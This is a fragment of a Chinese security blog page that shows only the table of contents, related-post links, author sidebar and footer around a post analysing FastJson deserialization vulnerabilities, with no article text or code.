href="#jni%E5%AD%97%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="toc-number">4.2.1.</span> <span class="toc-text">JNI 字段描述符</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#l"><span class="toc-number">4.2.1.1.</span> <span class="toc-text">L;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-5"><span class="toc-number">4.2.1.2.</span> <span class="toc-text">调试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link"><span class="toc-number">4.2.1.3.</span> <span class="toc-text">[</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%AF%BB%E6%89%BE%E6%8A%A5%E9%94%99%E5%8E%9F%E5%9B%A0"><span class="toc-number">4.2.1.4.</span> <span class="toc-text">调试寻找报错原因</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E8%B0%83%E8%AF%95"><span class="toc-number">4.2.1.5.</span> <span class="toc-text">第二次调试</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mappings"><span class="toc-number">4.2.2.</span> <span class="toc-text">mappings</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B0%83%E8%AF%95-6"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">调试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1242"><span class="toc-number">4.3.</span> <span class="toc-text">fastjson&#x3D;1.2.42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1243"><span class="toc-number">4.4.</span> <span class="toc-text">fastjson&#x3D;1.2.43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson1244"><span class="toc-number">4.5.</span> <span class="toc-text">fastjson&#x3D;1.2.44</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2023/03/26/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="java反射">java反射</a></li><li><a href="/2023/04/01/java%E5%AE%89%E5%85%A8/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" rel="bookmark" title="RMI浅记">RMI浅记</a></li><li><a href="/2023/04/14/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="java反序列化">java反序列化</a></li><li><a href="/2023/05/16/java%E5%AE%89%E5%85%A8/CommonsCollections-1/" rel="bookmark" title="ConmonsCollection-1">ConmonsCollection-1</a></li><li><a href="/2023/05/24/java%E5%AE%89%E5%85%A8/CommonsCollections-6/" rel="bookmark" title="ConmonsCollection-6">ConmonsCollection-6</a></li><li><a href="/2023/07/10/java%E5%AE%89%E5%85%A8/CommonsCollections-3/" rel="bookmark" title="ConmonsCollection-3">ConmonsCollection-3</a></li><li><a href="/2023/08/03/java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1/" rel="bookmark" title="CC1">CC1</a></li><li><a href="/2023/08/04/java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC6/" rel="bookmark" title="CC6">CC6</a></li><li><a href="/2023/08/09/java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a></li><li><a href="/2023/09/23/java%E5%AE%89%E5%85%A8/JNDI%E6%B3%A8%E5%85%A5/" rel="bookmark" title="JNDI注入">JNDI注入</a></li><li class="active"><a href="/2023/10/14/java%E5%AE%89%E5%85%A8/FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="FastJson漏洞分析">FastJson漏洞分析</a></li><li><a href="/2023/10/28/java%E5%AE%89%E5%85%A8/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" rel="bookmark" title="Jackson漏洞分析">Jackson漏洞分析</a></li><li><a href="/2023/10/31/java%E5%AE%89%E5%85%A8/Classloader/" rel="bookmark" title="ClassLoader">ClassLoader</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">92</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">16</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">51</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/10/03/pwn/%E6%9E%84%E9%80%A0shellcode%EF%BC%88%E6%B0%B4%E8%B4%A7%E6%BB%A1%E6%BB%A1%EF%BC%89/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/10/17/Vulnhub/VulnHub-DC%E7%AF%87DC-1/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/19/Vulnhub/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Hacker_Kid-v1.0.1靶机打靶记录">Hacker_Kid-v1.0.1靶机打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/01/ctfshow/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/05/ctfshow/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="CTFshow-web入门文件包含">CTFshow-web入门文件包含</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/02/15/ctfshow/php%E7%89%B9%E6%80%A7/" title="CTFshow-web入门php特性">CTFshow-web入门php特性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/ctfshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/07/20/ctfshow/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/" title="CTFshow-web中期测评">CTFshow-web中期测评</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/10/19/Vulnhub/VulnHub-DC%E7%AF%87DC-2/" title="DC-2">DC-2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/08/09/java%E5%AE%89%E5%85%A8/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="Shiro反序列化漏洞">Shiro反序列化漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/08/03/java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1/" title="CC1">CC1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2023/08/16/Casualessay/HTTP%E8%B5%B0%E7%A7%81/" title="Http走私">Http走私</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Woodenhorse/" title="分类于 内存马">内存马</a></div><span><a href="/2023/11/02/Woodenhorse/Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" title="Servlet内存马">Servlet内存马</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2022 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">901k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">13:39</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/10/14/java安全/FastJSON反序列化漏洞/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->